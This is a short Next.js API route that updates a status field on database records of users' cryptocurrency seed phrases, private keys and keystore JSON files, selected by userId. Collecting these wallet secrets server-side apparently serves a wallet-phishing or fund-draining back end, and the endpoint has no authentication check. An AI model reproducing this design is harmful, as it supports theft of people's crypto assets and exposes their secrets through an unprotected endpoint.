import { connectToDB } from "@/lib/connectDB";
import SeedPhrase from "@/models/SeedPhrase";
import PrivateKey from "@/models/PrivateKey";
import KeystoreJson from "@/models/KeystoreJson";

export async function POST(req) {
  try {
    await connectToDB();

    const { userId, itemType, status } = await req.json();

    if (!userId || !itemType || !status) {
      return Response.json({ error: "Missing required fields" }, { status: 400 });
    }

    let model;
    if (itemType === "seedWords") model = SeedPhrase;
    else if (itemType === "privateKey") model = PrivateKey;
    else if (itemType === "keystoreJson") model = KeystoreJson;
    else return Response.json({ error: "Invalid itemType" }, { status: 400 });

    const updated = await model.findOneAndUpdate(
      { userId },
      { status },
      { new: true }
    );

    if (!updated) {
      return Response.json({ error: "Not found" }, { status: 404 });
    }

    return Response.json({ success: true, status: updated.status });
  } catch (err) {
    return Response.json({ error: err.message || "Server error" }, { status: 500 });
  }
}